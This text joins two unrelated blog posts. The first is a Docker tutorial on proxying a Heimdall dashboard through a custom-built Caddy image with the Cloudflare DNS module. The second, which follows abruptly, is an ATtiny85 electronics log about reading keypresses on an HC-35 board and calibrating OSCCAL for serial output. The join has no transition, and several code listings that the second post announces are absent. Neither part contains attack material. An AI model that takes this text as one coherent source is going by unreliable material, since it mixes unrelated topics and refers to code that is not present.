<p>For this tutorial, I’m going to use the <a href="https://github.com/linuxserver/docker-heimdall" target="_blank">Heimdall</a> image from our friends over at LinuxServer.io. Heimdall is a nice customizable landing page for organizing your applications.</p>

<p>I like to make separate directories for each app in my home directory, then have a docker-compose file for each. I
realize that this isn’t the most efficient way to get apps running (it’s not one giant docker-compose file), but it helps me keep everything organized SO BACK OFF!</p>


  <figure>
    <img src="https://blog.atkinson.cloud/posts/2021/02/running-caddy-as-a-reverse-proxy-with-cloudflare-dns/cloud_folders.jpg">
    
  </figure>



<p>Here’s my docker-compose.yaml file for heimdall:</p>

<pre><code>---
version: "2.1"
services:
  heimdall:
    image: ghcr.io/linuxserver/heimdall
    container_name: heimdall
    environment:
      - PUID=1000
      - PGID=1000
      - TZ=Europe/London
    volumes:
      - ./config:/config
    ports:
      - 8080:80
     # - 4443:443
    restart: unless-stopped

networks:
  default:
    external:
      name: caddy_net
</code></pre>

<p>Go ahead and save the file in your heimdall directory. Before running the container, we need to set-up the docker network (“caddy-net”) that heimdall and any other reverse proxied applications will use. (You can see it at the end of the file we just created). To do this, issue the following command:</p>

<p><code>docker network create caddy_net</code></p>

<div><p>Now we can start Heimdall. Use the command <code>docker-compose up -d</code> within the “heimdall” directory to get
your container up and running. Check to make sure it is running properly with a quick <code>docker ps -a</code></p></div>

<h2 id="step-3-caddy-time">Step 3 - Caddy time</h2>

<p>After trying a few different methods, I decided to run Caddy itself as a docker container, since I was already used to running the nginx-proxy and let’s encrypt companion that way. I first tried (and failed … a lot) with the official Caddy docker image, but I couldn’t get the cert process with cloudflare working. Eventually, I found the <a href="https://caddyserver.com/docs/modules/dns.providers.cloudflare" target="_blank">Caddy Cloudflare DNS Module</a>, which allows you to plug in an API token from your Cloudflare account, thus allowing DNS verification for your certs. Okay, sounds good. Now how the eff do I use this thing, since I have very little experience with Go modules?</p>

<p>The short answer is that you build a custom Caddy image with this module included. In your Caddy directory, create the
following Dockerfile:</p>

<pre><code>FROM caddy:2.2.1-builder AS builder

RUN xcaddy build v2.2.1 --with github.com/caddy-dns/cloudflare@latest

FROM caddy:2.2.1

COPY --from=builder /usr/bin/caddy /usr/bin/caddy
</code></pre>

<p>I’m not an expert with Dockerfiles, but let’s walk through this one. This is a multistage build that first takes the caddy 2.2.1-builder base image and uses a command-line tool called xcaddy to add the Cloudflare DNS module into the image. In the second stage of the build, the Caddy binary produced in first stage is copied into a fresh caddy 2.2.1 image. This new custom Caddy image is the one we will use for our reverse proxy container.</p>

<p>The next file we’ll need is our docker-compose.yaml.  <code>nano docker-compose.yaml</code></p>

<pre><code>#docker-compose.yaml
---
version: "3.4"
services:
  caddy:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: caddy
    restart: always
    ports:
      - 80:80
      - 443:443
      - 2019:2019
    volumes:
      - ./config:/config
      - ./data:/data
      - ./Caddyfile:/etc/caddy/Caddyfile

networks:
  default:
    external:
      name: caddy_net
</code></pre>

<p>You can see that the Caddy container will also be part of the caddy_net network, allowing it to communicate with Heimdall. The volumes listed can be configured to go elsewhere on the host side (the part <em>before</em> the colon) if you prefer.</p>

<p>Finally, we’re going to create what’s called a Caddyfile: <code>nano Caddyfile</code></p>

<pre><code>#Caddyfile

test2.atkinson.cloud {
	reverse_proxy heimdall:80

	tls {
                dns cloudflare &lt;insert_cloudflare_api_token_here&gt;
        }
}
</code></pre>

<p>The structure above proxies my “test2” subdomain to heimdall at its non-TLS container port 80 <sup id="fnref:3"><a href="#fn:3">4</a></sup>. Additionally, it takes a cloudflare API token to confirm control of the subdomain, so don’t forget to substitute yours in. This last part of the Caddyfile (and the code behind it) is the only reason for that whole multistage docker build we’re about to do.</p>

<p>Okay, so our caddy directory should now have three files: <code>Dockerfile</code>, <code>docker-compose.yaml</code>, and <code>Caddyfile</code>.</p>

<div><p>Fire-up Caddy with <code>docker-compose up</code> and watch the magic. Your custom docker container will be built and will likely take a few minutes to complete. After it’s complete, you should begin to see the log output from Caddy as it negotiates successfully with Cloudflare and downloads a cert from Let’s Encrypt.

<p>Nice!</p>

<div><p>Now that seems like kind of a lot of work to set up, especially for the reverse proxy solution that is touted as “so easy and quick.” However, the real benefit of this system is that once it’s set up, all you have to do add a new docker app with a docker-compose file, and then add a few lines into the existing Caddyfile to have a second, third, fourth, etc application up and running <strong>quickly</strong>. Would I recommend switching to Caddy if you’re currently using the Nginx-Proxy + Let’s Encrypt Companion containers or some other functional solution? No I wouldn’t because, at the end of the day, both work just fine. However, if you’re just starting out with self-hosting on the cloud, I’d say Caddy is a pretty compelling reverse proxy option.

<p><a href="https://www.nu42.com/2021/01/attiny85-liyafy-hc-35-8-led-keypad-serial-in-parallel-out-shift-register.html" title="Controlling LEDs on the Liyafy HC-35 using ATtiny85">Last time</a>, I was just excited to get some lights to blink. Since then, I’ve figured out a few things. For example, if a bit in the output is set, the corresponding LED on the HC-35 is <em>turned off</em>. Therefore, to get the pleasing animated counting effect I wanted, I needed to send the complement of the number to the shift register. I also worked on tidying up some of the wiring to get things slightly more organized on the breadboard to prepare for six more wires coming in from the HC-35 and placing another ATtiny85 on the board. It turned out that I needed to run a separate pair of VCC/GND to the second ATtiny85 which where that power supply really shone.</p>
<p>So, before proceeding further, here is the improved code for flashing the LEDs on the HC-35:</p>

<p>Satisfied that each LED was being turned on from the LSB to MSB and they were counting from <code>0</code> to <code>255</code> in binary, I turned my attention to the task of getting key press information.</p>
<p>I took for granted that I could read the keypresses using four wires. That turned out to be a correct assumption. So, four pins for reading keys, one pin for VCC, one pin for GND, the RESET pin which I am <em>not</em> going to disable because <a href="https://electronics.stackexchange.com/q/258997/276109">I do not want to <q>need a high voltage serial programmer to reprogram the chip</q></a>. That leaves one pin to get information out. My mistake was assume that I should immediately figure out how use <a href="https://www.arduino.cc/en/Reference/SoftwareSerialConstructor" title="SoftwareSerial documentation">SoftwareSerial</a> or similar to output bytes on that pin. I decided to try to use <code>PB4</code> because mapping four keys to <code>PB0</code>–<code>PB3</code> just made sense even though I know <code>PB2</code> has abbreviations associated with serial interfaces next to it. At first, I had been using the pin change interrupts to read key states, but then <code>SoftwareSerial</code> wants to install its own handlers for receive operations. Remember, I am only interested in getting information out. Stuff was just not working out. So, I decided to take a step back and proceed in small, discrete steps.</p>
<p>How about <em>proving</em> that I can read key states using the simplest approach? I decided I wanted audible confirmation that I was able to distinguish which specific key was pressed. So, I just wrote a simple busy loop, wired up the active buzzer to <code>PB4</code>. And, it works:</p>

<p>Here’s a photo of the slightly cleaned up placement and wiring of all the components:</p>
<p><a title="One ATtiny85 blinking LEDs, another reading keypresses and chirping an active buzzer in response" href="https://www.nu42.com/2021/02/attiny85-active-buzzer-liyafy-hc-35-red-keys.jpg"><img alt="[ One ATtiny85 blinking LEDs, another reading keypresses and chirping an active buzzer in response ]" width="400" src="https://www.nu42.com/2021/02/attiny85-active-buzzer-liyafy-hc-35-red-keys-thumb.jpg"></a></p>
<p>And here’s a <a href="https://youtu.be/7ZpFFdNyAks" title="Video on YouTube">video of the buzzer chirping in response to key presses and LEDs flashing pleasingly</a>. I kept the buzzer covered because otherwise it was getting too loud on the video. In case the chirping is not audible, I added a yellow LED inline to also give a visual indication that different keypresses generate different output.</p>
<p>At this point, I was ready it call it a day, but something else came up. Later, I did a search for using SotwareSerial at low bit rates, and I found <a href="https://forum.arduino.cc/index.php?topic=351913.0">a forum post</a> where the possibility of fiddling with the calibration of the oscillator was mentioned. The OP posted a calibration routine which looped through values <code>0</code> to <code>255</code> for <code>OSCCAL</code>, sending the output on the serial line it was trying to use. Watching on the monitor, you could see at what <code>OSCCAL</code> value you stopped seeing gibberish. My first few attempts were discouraging because after running it or five minutes or so, I would see long periods of nothing punctuated by some gibberish. I decided to fiddle with the calibration routine by instead starting at the mid-point by setting <code>OSCCAL = 128</code>, and then adding <code>Δ ∈ {±1, ±2, ±3, ... ±127}</code>. Yeah, this misses <code>OSCCAL = 0</code> but we’ve already established I don’t see anthying at that value.</p>
<p>Surprise!</p>
<p>Here’s the calibration routine:</p>

<p>Now, I have decided I’d rather not use <code>SoftwareSerial</code> in the actual project, but it does the job of helping me discover the <code>OSCCAL</code> value at which serial communication works. In the case, I have a baud rate of <code>300</code> mostly because it creates a retro effect in the serial monitor. It might also be the right baud rate to use for this project, but let’s not get ahead of ourselves. I can’t adapt one of those send only serial libraries without knowing the value of <code>OSCCAL</code> which makes serial work reliably.</p>
<p>It is at this point that I decided to get fancy: Why not give me button to tell the ATtiny85 to save the current value in EEPROM so I don’t have to remember to set it manually in every the actual code that uses serial comms? Note that it is not clear I gain much from this as now I have to remember to add EEPROM support to the code that uses the value. But, I am doing this for fun, so why not? My first search landed me on <a href="https://arduino.stackexchange.com/q/25080/70572">this question</a> and <a href="https://arduino.stackexchange.com/a/25086/70572">this helpful answer</a> told me I needed to modify <code>boards.txt</code> in Arduino IDE to set <a href="http://eleccelerator.com/fusecalc/fusecalc.php?chip=attiny85&amp;LOW=E2&amp;HIGH=D7&amp;EXTENDED=FF&amp;LOCKBIT=FF">“high fuse” to <code>0xD7</code> instead o <code>0xDF</code></a> for the EEPROM to be preserved when I reprogram the chip.</p>
<p>When you have the tempatation to get fancy … resist. This where things went a bit wrong. First, I shorted the push button on the breadboard. Then, I burned the ATtiny85 by inserting it the wrong way in the programmer. Finally, <a href="https://amzn.to/39Vjj90" title="Amazon.com affiliate link for DSD TECH SH-U09C5 USB to TTL UART Converter Cable with FTDI Chip">fancy USB to TTL UART converter</a> became unresponsive (possibly due to me connecting one of the legs of that button to 5V instead of GND). So, took another break from this and came back to it later.</p>
<p>The next ATtiny85 did not seem to have an initial <code>OSCCAL</code> value anywhere near the middle of the 0 … 255 range, so I decided to fiddle with the search to make it asymmetric around the value of <code>OSCCAL</code> at startup. Here is the code (note, I’ve kind a left the saving the EEPROM thing as an exercise for the reader):</p>
